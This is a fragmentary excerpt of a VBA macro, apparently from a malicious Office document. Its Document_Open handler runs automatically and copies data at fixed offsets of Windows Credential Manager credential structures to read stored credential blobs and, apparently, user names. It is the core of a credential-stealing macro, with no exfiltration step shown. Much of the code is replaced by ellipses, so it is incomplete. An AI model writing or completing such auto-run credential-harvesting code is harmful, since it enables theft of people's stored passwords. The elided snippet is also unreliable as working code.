...
```vba
'=== WCM credential structure reference ====
'
...
Private Sub Document_Open()
   ...
   Dim rval As Long, j As Long, blobsize As Long
   ...
   If rval <> 0 Then
      CopyMemory dword(0), ByVal (cred + 32), 4
      ...
      Else
         ...
         CopyMemory paddr, ByVal (cred + 40), 8
         ...
         Next i
         blob = LCase(blob)
         CopyMemory paddr, ByVal (cred + 72), 8
